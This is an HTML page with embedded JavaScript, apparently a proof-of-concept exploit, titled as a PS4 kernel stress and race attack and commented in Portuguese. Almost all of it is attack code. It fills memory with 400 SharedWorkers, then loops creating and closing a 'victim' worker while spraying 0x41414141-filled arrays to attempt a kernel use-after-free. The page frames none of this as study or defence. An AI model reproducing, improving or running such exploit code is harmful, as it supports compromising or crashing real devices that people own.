<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Kernel Stress & Race PoC</title>
</head>
<body>

    <h1>Kernel Grooming & Race Exploit</h1>
    <p>Strategy: Fill to 400 (Lag Zone) -> Attempt UAF Race</p>

    <div id="status">Status: Idle</div>
    <div id="log">Logs:<br></div>

    <button onclick="startExploit()">START STRESS + RACE</button>

    <script>
        // CONFIGURAÇÃO
        const FILL_TARGET = 400; // O ponto logo antes do lag extremo
        const SPRAY_SIZE = 1024 * 64; // Tamanho do chunk
        
        let fillers = [];
        let raceInterval;

        function log(msg) {
            document.getElementById('log').innerHTML = `> ${msg}<br>` + document.getElementById('log').innerHTML;
        }

        function updateStatus(msg) {
            document.getElementById('status').innerText = "Status: " + msg;
        }

        async function startExploit() {
            if (!window.SharedWorker) return log("SharedWorker not supported.");

            // FASE 1: ENCHER A MEMÓRIA (PREPARAR O TERRENO)
            updateStatus("Filling Memory...");
            log(`Alocando ${FILL_TARGET} workers de base...`);
            
            let count = 0;
            const fillLoop = setInterval(() => {
                for(let i=0; i<5; i++) {
                    if (count >= FILL_TARGET) {
                        clearInterval(fillLoop);
                        log("Base alocada. O sistema deve estar levemente lento.");
                        setTimeout(startRacePhase, 1000); // Pausa para estabilizar
                        return;
                    }
                    try {
                        const sw = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", "fill_" + count);
                        sw.port.start();
                        fillers.push(sw);
                        count++;
                    } catch(e) {
                        clearInterval(fillLoop);
                        log("Erro no Filler: " + e.message);
                    }
                }
            }, 10);
        }

        function startRacePhase() {
            updateStatus("RACING (UAF Attempt)");
            log("Iniciando Race Condition em ambiente estressado...");
            log("Tentando alocar/liberar o slot 401 repetidamente...");

            let cycle = 0;
            
            // FASE 2: O LOOP DE CORRIDA (Create -> Close -> Spray)
            raceInterval = setInterval(() => {
                cycle++;
                
                // 1. Cria o worker "Vítima" (O número 401)
                let victim;
                try {
                    victim = new SharedWorker("data:text/javascript,onconnect=e=>e.ports[0].start()", "victim_" + cycle);
                    victim.port.start();
                } catch(e) {
                    // Se falhar a criação, o kernel tá cheio demais. Tentamos de novo.
                    return;
                }

                // 2. O GOLPE: Fecha e Spray quase simultâneo
                // Como o sistema está com lag (pelos 400 workers), o Kernel demora para processar o close.
                victim.port.close();
                victim = null; // Remove referência JS

                // 3. Spray Imediato
                // Tentamos colocar 0x41414141 no lugar onde o worker 401 estava
                try {
                    const spray = new Uint32Array(SPRAY_SIZE).fill(0x41414141);
                    // Não guardamos referência do spray para não estourar RAM, 
                    // queremos apenas que ele passe pela memória do Kernel.
                } catch(e) {}

                if (cycle % 100 === 0) log(`Race Cycles: ${cycle}`);

            }, 50); // Intervalo controlado
        }

    </script>
</body>
</html>
